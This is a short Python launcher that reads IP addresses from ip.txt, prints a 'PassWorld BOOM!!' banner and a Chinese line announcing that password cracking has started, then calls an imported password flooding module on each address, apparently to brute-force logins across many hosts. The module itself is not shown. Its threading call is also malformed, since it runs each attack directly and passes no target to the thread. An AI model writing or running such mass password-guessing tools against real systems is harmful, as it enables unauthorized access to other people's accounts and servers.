import  threading
import pyfiglet
import password_flood_module
if __name__ == '__main__':
    with open('ip.txt','rb') as f:
        file = f.read().decode('utf-8')
    iplist = file.split('\n')
    result = pyfiglet.figlet_format("PassWorld BOOM!!")
    print (result)
    print ('[*]密码爆破开始!')
    for i in range(0,len(iplist)):
        print (iplist[i])
        t = threading.Thread(password_flood_module.start(iplist[i]))
        t.start()

